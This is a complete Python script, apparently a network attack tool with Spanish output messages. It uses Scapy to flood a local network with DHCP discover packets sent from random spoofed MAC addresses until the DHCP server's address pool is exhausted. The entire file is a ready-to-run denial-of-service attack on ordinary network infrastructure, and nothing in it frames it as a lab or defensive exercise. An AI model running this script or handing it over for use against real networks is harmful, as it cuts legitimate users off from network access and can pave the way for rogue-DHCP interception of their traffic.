#!/usr/bin/env python3

import sys
from scapy.all import *

def lanzar_dhcp_starvation(interfaz):
    print(f"[*] Iniciando ataque DHCP Starvation en la interfaz {interfaz}")
    print("[*] Generando peticiones con MACs aleatorias para agotar el pool...")
    print("[*] Presiona Ctrl+C para detener.")
 
    conf.checkIPaddr = False
    
    try:
        while True:
            mac_falsa = RandMAC()
            
            capa_ethernet = Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff")
            capa_ip = IP(src="0.0.0.0", dst="255.255.255.255")
            capa_udp = UDP(sport=68, dport=67)
            
            capa_bootp = BOOTP(op=1, chaddr=mac_falsa)
            capa_dhcp = DHCP(options=[("message-type", "discover"), "end"])
            
            paquete_starvation = capa_ethernet / capa_ip / capa_udp / capa_bootp / capa_dhcp
            
            sendp(paquete_starvation, iface=interfaz, verbose=False)
            
    except KeyboardInterrupt:
        print("\n[+] Ataque DHCP Starvation detenido por el usuario.")

if __name__ == "__main__":
    interfaz_red = "eth0"
    if len(sys.argv) > 1:
        interfaz_red = sys.argv[1]
        
    lanzar_dhcp_starvation(interfaz_red)
